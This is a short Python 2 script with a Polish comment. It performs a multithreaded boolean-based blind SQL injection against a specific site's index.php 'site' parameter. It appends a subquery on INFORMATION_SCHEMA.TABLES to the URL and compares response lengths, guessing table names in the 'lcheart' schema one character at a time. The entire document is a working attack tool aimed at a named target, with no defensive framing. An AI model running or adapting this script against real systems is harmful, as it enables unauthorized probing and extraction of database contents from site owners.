#!/usr/bin/python

'''
wielowatkowosc (countThreads) oraz w url {string} musi byc ;) 
'''


import urllib2
import array
import time
import threading

charsArray = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','_']
url = 'http://blaszczakm.blogspot.com/index.php?site=10%20AND%20(SELECT%20COUNT(*)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA%20=%20%27lcheart%27%20AND%20TABLE_NAME%20LIKE%20%27{string}%25%27)'



acceptableLength = 17834
countThreads = 2

foundArray = []
checkArray = []
threadsArray = []
tempArray = []
checkArray = charsArray
lock = threading.Lock()
step = 0
endWhile = False

def blind( strUrl ):
   response = urllib2.urlopen(strUrl)
   result = response.read()
   return len(result);
   
def findAcceptable ( foundArray, tempArray, value ):
	resultLength = blind(url.replace('{string}', value.replace('_', '\_')))
	if resultLength == acceptableLength:
		with lock:
			print '### Found: ' + value
			foundArray.append(value)
			for char in charsArray:
				tempArray.append(value + char)
	else:
		with lock:
			print '... Nope: ' + value 

while not endWhile:
	endWhile = True
	step += 1
	print '##### STEP ' + str(step) + ' ######'
	del tempArray[:]
	del threadsArray[:]
	
	for value in checkArray:
		while threading.activeCount() >= countThreads + 1:
			pass
		thread = threading.Thread(target = findAcceptable, args = (foundArray, tempArray, value))	
		threadsArray.append(thread)
		thread.start()

	while threading.activeCount() > 1:
		pass
	
	if len(tempArray) > 0:
		endWhile = False
	
	checkArray = list(tempArray)

foundArray.sort()
for item in foundArray:
	print item
